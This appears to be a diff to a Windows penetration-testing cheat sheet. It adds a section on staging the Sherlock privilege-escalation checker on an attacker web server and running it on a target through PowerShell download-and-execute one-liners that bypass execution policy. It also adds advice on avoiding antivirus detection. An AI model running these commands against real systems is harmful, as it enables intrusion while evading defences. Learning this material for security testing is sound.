@@ -13,7 +13,7 @@ net users
 ```
 
 ## Uploading files to the Windows machine  
-Most of the time we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  
+Sometimes we will want to upload a file to the Windows machine in order to speed up our enumeration or to privilege escalate.  Often you will find that uploading files is not needed in many cases if you are able to execute PowerShell that is hosted on a remote webserver (we will explore this more in the upgrading Windows Shell, Windows Enumeration and Windows Exploits sections).  Uploading files increased the chances of being detected by antivirus and leaves unnecssary data trail behind. 
 We will look at 4 ways of uploading files to a remote Windows machine from Kali Linux:  
 1. VBScript HTTP Downloader
 2. PowerShell HTTP Downloader
@@ -161,6 +161,31 @@ Sometimes it is helpful to create a new Netcat session from an existed limited s
 # Windows Enumeration
 
 ### Running Sherlock
+Sherlock is a powershell library with a number of privledge escalation checkers built in. 
+We can stage and run sherlock on a remote http server so the file never needs to hit the remote server's HDD.  
+```bash
+root@kali:~test# git clone https://github.com/rasta-mouse/Sherlock.git
+Cloning into 'Sherlock'...
+remote: Enumerating objects: 3, done.
+remote: Counting objects: 100% (3/3), done.
+remote: Compressing objects: 100% (3/3), done.
+remote: Total 75 (delta 0), reused 2 (delta 0), pack-reused 72
+Unpacking objects: 100% (75/75), done.
+root@kali:~test# cd Sherlock/
+root@kali:~test/Sherlock# ls
+LICENSE  README.md  Sherlock.ps1
+root@kali:~test/Sherlock# echo Find-AllVulns >> Sherlock.ps1
+root@kali:~test/Sherlock# python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+```
+Now we can run this from the remote Windows CMD shell:  
+```cmd
+@"%SystemRoot%\System32\WindowsPowerShell\v1.0\powershell.exe" -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "iex ((New-Object System.Net.WebClient).DownloadString('http://10.10.10.10/Sherlock.ps1'))"
+```
+Or from a Windows Powershell:
+```powershell
+IEX(New-Object Net.Webclient).downloadString('http://10.10.10.10/Sherlock.ps1')
+```
 
 ### Running Mimicatz
 
